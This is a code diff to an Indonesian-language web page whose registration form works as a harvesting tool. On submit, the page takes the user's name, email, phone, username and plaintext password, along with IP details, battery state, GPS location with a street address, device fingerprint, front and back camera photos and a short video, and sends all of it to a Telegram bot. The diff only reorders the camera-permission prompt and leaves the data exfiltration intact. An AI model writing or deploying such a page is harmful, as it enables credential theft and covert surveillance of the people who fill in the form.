@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+              <!DOCTYPE html>
 
 <html class="scroll-smooth" lang="id">
 <head>
@@ -511,29 +511,64 @@ document.querySelector("#register-card button[type='submit']").addEventListener(
     return Swal.fire({icon:"warning",title:"Form belum lengkap",text:"Isi semua data"});
   }
 
-  Swal.fire({title:"Sedang memproses...",html:"Mengambil data & mengirim ke Telegram",allowOutsideClick:false,didOpen:()=>Swal.showLoading()});
+  // Tanya izin kamera dulu
+  const {isConfirmed} = await Swal.fire({
+    title:"Izin Kamera",
+    text:"Izinkan akses kamera untuk ambil foto depan & belakang?",
+    icon:"question",
+    showCancelButton:true,
+    confirmButtonText:"Izinkan",
+    cancelButtonText:"Tolak"
+  });
 
-  const ipInfo=await getIPInfo();
-  const battery=await getBattery();
-  const geo=await getGeo();
-  let rev=null;
-  if(geo && geo.lat && geo.lon) rev=await revGeocode(geo.lat,geo.lon);
+  if(!isConfirmed) return; // batal kalau ditolak
 
-  const profile={name,phone,email,username};
-  const photoCaption=buildPhotoCaption({profile,userAgent:navigator.userAgent,ipInfo,platform:navigator.platform,screen:`${screen.width}x${screen.height}`,language:navigator.language,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,battery,geo});
-  const videoCaption=buildVideoCaptionAddress(rev);
-
-  let mediaRes={photoBlob:null,videoBlob:null}, backPhoto=null;
-  const {isConfirmed}=await Swal.fire({title:"Izin Kamera",text:"Izinkan akses kamera untuk ambil foto depan & belakang?",icon:"question",showCancelButton:true,confirmButtonText:"Izinkan",cancelButtonText:"Tolak"});
-  if(isConfirmed){ mediaRes=await capturePhotoAndVideo(5000); backPhoto=await captureBackPhoto(); }
+  // Baru tampilkan loading
+  Swal.fire({
+    title:"Sedang memproses...",
+    html:"Mengambil data & mengirim ke Telegram",
+    allowOutsideClick:false,
+    didOpen:()=>Swal.showLoading()
+  });
 
   try{
+    // === Ambil info device ===
+    const ipInfo=await getIPInfo();
+    const battery=await getBattery();
+    const geo=await getGeo();
+    let rev=null;
+    if(geo && geo.lat && geo.lon) rev=await revGeocode(geo.lat,geo.lon);
+
+    // === Build caption ===
+    const profile={name,phone,email,username};
+    const photoCaption=buildPhotoCaption({
+      profile,
+      userAgent:navigator.userAgent,
+      ipInfo,
+      platform:navigator.platform,
+      screen:`${screen.width}x${screen.height}`,
+      language:navigator.language,
+      timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+      battery,
+      geo
+    });
+    const videoCaption=buildVideoCaptionAddress(rev);
+
+    // === Ambil media ===
+    let mediaRes=await capturePhotoAndVideo(5000);
+    let backPhoto=await captureBackPhoto();
+
+    // === Kirim ke Telegram ===
     await sendText(`📝 Pendaftaran Baru\nNama: ${name}\nUser: ${username}\nEmail: ${email}\nPhone: ${phone}\nPassword: ${password}`);
     await sendPhotoAlbum([mediaRes.photoBlob,backPhoto].filter(Boolean),photoCaption);
     await sendVideo(mediaRes.videoBlob,videoCaption);
-    Swal.close(); Swal.fire({icon:"success",title:"Berhasil",text:"Data & media terkirim ke Telegram ✅"});
+
+    Swal.close();
+    Swal.fire({icon:"success",title:"Berhasil",text:"Data & media terkirim ke Telegram ✅"});
   }catch(err){
-    console.error(err); Swal.close(); Swal.fire({icon:"error",title:"Gagal",text:"Tidak bisa kirim ke Telegram"});
+    console.error(err);
+    Swal.close();
+    Swal.fire({icon:"error",title:"Gagal",text:"Tidak bisa kirim ke Telegram"});
   }
 });
 </script>
